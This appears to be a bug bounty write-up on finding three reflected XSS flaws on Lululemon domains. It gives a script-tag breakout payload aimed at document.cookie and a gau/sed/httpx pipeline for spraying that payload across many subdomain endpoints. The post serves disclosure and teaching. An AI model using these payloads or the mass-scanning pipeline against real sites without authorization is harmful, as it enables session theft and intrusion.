# How I found 3 RXSS on Lululemon bug bounty program


Hi everybody, today i will show you how can simple technique lead you to find multiple series vulnerabilities across the whole subdomains


### Let’s start our story


While i was hunting on [Lululemon](https://bugcrowd.com/lululemon) program on Bugcrowd


I started to take a look on the main domain [https://www.lululemon.co.uk](https://www.lululemon.co.uk)


After i have spend some time on the main domain i started to do parameter brute force using [Arjun](https://github.com/s0md3v/Arjun)

>

┌──(omar㉿kali)-[~]
└─$ arjun -u [https://www.lululemon.co.uk](https://www.lululemon.co.uk)/en-uk/search -oT lululemon-parameters


The output file was look like that


>

┌──(omar㉿kali)-[~]
└─$ cat lululemon-parameters|qsreplace omar


requesting the link in browser found that q parameter value is reflected between double quotes inside script tag


`<script>some javascript code;var q="omar"; some javascript code;</script>`


i tried to get out of the double quote and injecting my payload inside script tag like this

>

[https://www.lululemon.co.uk](https://www.lululemon.co.uk)/en-uk/search?q=omar“;alert(domain);//


but the reflection was like that


`<script>some javascript code;var q="omar\";alert(domain);//"; some javascript code;</script>`


So it looks like that the developer bypass the quotes to prevent attackers to get out from the double quotes to not inject malicious code


What about open tag <

>

[https://www.lululemon.co.uk](https://www.lululemon.co.uk)/en-uk/search?q=omar<


the reflection was like that


`<script>some javascript code;var q="omar<"; some javascript code;</script>`


So I expected the developers used code in the backend to print the value of the q parameter like this

Remember me for faster sign in


`<?php echo(addslashes($_GET['q'])) ?>`


This means we can’t use quotes but we can close the script tag then open a new tag and write our javascript code in it

>

[https://www.lululemon.co.uk](https://www.lululemon.co.uk)/en-uk/search?q=</script><script>alert(document.cookie)</script>


### The first XSS on:


[https://www.lululemon.co.uk](https://www.lululemon.co.uk)


Usually when developers make a mistake there is a high possibility to make it on other places


So the next step is to test this XSS on the other domains and subdomains endpoints

### Simple Recon:


Passively collect endpoints with [gau](https://github.com/lc/gau) tool then using [uro](https://github.com/s0md3v/uro) tool to get unique endpoints, filter image, js, css and other static files

>

┌──(omar㉿kali)-[~]
└─$ cat subdomains.txt|gau |uro >endpoints.txt


Using sed command to add our “q” parameter to the all endpoints with url encoded payload “</script><script>alert(document.cookie)</script>” as a value

>

┌──(omar㉿kali)-[~]
└─$ sed -E -i “s/\?(.*)|$/\?q=%3C%2Fscript%3E%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E/g” endpoints.txt


Using httpx to request the endpoints and matching on our payload using argument -ms

>

┌──(omar㉿kali)-[~]
└─$ httpx -l endpoints.txt -ms “</script><script>alert(document.cookie)</script>”


And that was the results

### The second XSS on:


[https://www.lululemon.co](https://www.lululemon.co.uk)m.hk


### The third XSS on:


[https://www.eu.lululemon.co](https://www.lululemon.co.uk)m
